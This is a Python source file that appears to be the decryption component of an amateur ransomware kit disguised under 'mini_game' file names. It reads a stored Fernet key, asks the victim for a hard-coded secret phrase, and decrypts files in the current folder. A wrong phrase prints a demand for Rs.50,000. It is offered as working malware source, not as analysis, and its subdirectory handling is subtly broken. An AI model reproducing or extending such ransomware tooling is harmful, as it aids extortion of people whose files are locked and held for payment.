import os
from cryptography.fernet import Fernet
from colored import fg

files = []
# first instance
for file in os.listdir():
    
    if file =='mini_game.py' or file=='itemvpsrans.key' or file=='mini_game_open.py' or file=='mini_game.exe' or file=='mini_game_open.exe' or file=='itemvpsranspaths.txt' or file=='itemlistvpsrans.key' or file=='other_code_to_added.txt':
        continue
    
    if os.path.isfile(file):
        files.append(file)

    if os.path.isdir(file):

        # second instance
        for dirfile in os.listdir(file):
            if dirfile =='mini_game.py' or dirfile=='itemvpsrans.key' or dirfile=='mini_game_open.py' or dirfile=='mini_game.exe' or dirfile=='mini_game_open.exe' or dirfile=='itemvpsranspaths.txt' or dirfile=='itemlistvpsrans.key':
                continue

            if os.path.isfile(dirfile):
                files.append(dirfile)

if len(files)==0:
    print('no files')

with open('itemvpsrans.key','rb') as key:
    secretkey=key.read()

secretphase = 'rans4615@ware'

user_phrase = input('Enter the secret phrase to decrypt files : ')

if user_phrase==secretphase:

    try:
        for file in files:
            with open(file,'rb') as thefile:
                contents = thefile.read()
            contents_decrypted=Fernet(secretkey).decrypt(contents)
            with open(file,'wb') as thefile:
                thefile.write(contents_decrypted)   
        print(fg('white')+'Congrats ! Your files are '+fg('blue')+'decrypted .'+fg('blue'))         
    except:
        print('error')
else:
    print(fg('red')+'Sorry wrong secret phrase ! Send me more Rs.50,000 money!'+fg('red'))

end=input(fg('white')+'Press Enter for exit.'+fg('white'))

